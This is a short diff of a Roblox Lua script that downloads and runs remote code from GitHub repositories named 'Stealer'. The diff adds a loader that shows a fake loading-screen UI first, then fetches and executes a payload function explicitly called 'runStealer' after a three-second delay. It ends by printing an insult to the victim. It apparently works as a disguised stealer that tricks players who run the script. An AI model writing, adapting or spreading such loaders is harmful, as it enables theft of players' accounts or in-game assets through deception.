@@ -1,8 +1,14 @@
-local function stealer()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Rayz-Hub-Main/Stealer/refs/heads/main/Plants-Vs-Zomvie-Hah", true))()
+local function loadUI()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ingenioushits/Stealer/refs/heads/main/Loading-Screen-Lua", true))()
 end
-local function loadui()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ingenioushits/Stealer/refs/heads/main/Loading-Screen-Lua",true))()
+
+local function runStealer()
+    task.wait(3) 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rayz-Hub-Main/Stealer/refs/heads/main/Plants-Vs-Zomvie-Hah", true))()
 end
-task.spawn(stealer)
-task.spawn(loadui)
+
+task.spawn(loadUI)
+
+task.spawn(runStealer)
+
+print("Rayz Hub • Dumb Fuck")
